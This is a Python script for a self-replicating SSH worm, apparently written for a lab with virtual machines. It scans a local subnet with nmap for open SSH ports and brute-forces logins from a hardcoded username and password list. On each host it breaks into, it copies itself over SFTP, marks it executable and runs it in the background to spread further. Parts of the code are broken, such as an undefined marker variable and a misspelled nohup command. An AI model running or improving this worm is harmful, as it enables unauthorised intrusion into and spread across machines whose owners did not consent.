import paramiko
import sys
import nmap
import os
import os.path
import socket, fcntl, struct
import netifaces

markerLocation = "/tmp/marker.txt"

wordList = [
('awesomeUserName', 'badPassword'),
('awesomeHacker101', 'password'),
('ubuntu', '123456'),		#VM1
('best_username', 'awesomePassword'),
('ubuntu', 'password'),		#VM2
('ubuntu', 'password1') ]	#VM3

def getHostsOnTheSameNetwork():
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
		
	return liveHosts


# Find if the target has already been infected with our worm
def isTargetInfected(ssh):

	infected = False
	try:
		sftpClient = ssh.open_sftp()
		     
		# Check if the file exists
		sftpClient.stat(infectionMarker)
	 
		# The system is already infected
		infected = True
	except:
		print("Target should be infected!!")

	return infected



def markSystem():
	marker = open(markerLocation, "w")
	marker.write("Dont forget to place witty remark here...")
	marker.close()


def getMachineIp():
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr
	


def attackHost(host):

	global wordList

	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	numTries = 0

	for (_username, _password) in wordList:
		try:
			ssh.connect(host, username=_username, password=_password)
			return (ssh, _username, _password)
		except:
			numTries = numTries + 1

	print("Number of attempts before correct connect: %d" %(numTries))

	return None


def startAttacking(wormLocation, isHost):

	network = getHostsOnTheSameNetwork()

	if isHost:
		print network

	for Host in network:
		
		sshInfo = attackHost(Host)

		if isHost:
			print("SSH Info: %s" %(str(sshInfo)))
		
		if sshInfo and isTargetInfected(sshInfo[0]) == False:
			
			sftpClient = sshInfo[0].open_sftp()
			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
			sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
			sshInfo[0].exec_command("nohub python /tmp/replicating_worm.py &")

		elif isHost:
			print("Could not spread to this host: %s" %(str(Host)))
	
	
if sys.argv[1] == "-h":
	print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread\n")
elif sys.argv[1] == "-host":
	markSystem()
	startAttacking("replicating_worm.py", True)
else:
	markSystem()
	startAttacking("replicating_worm.py", False)




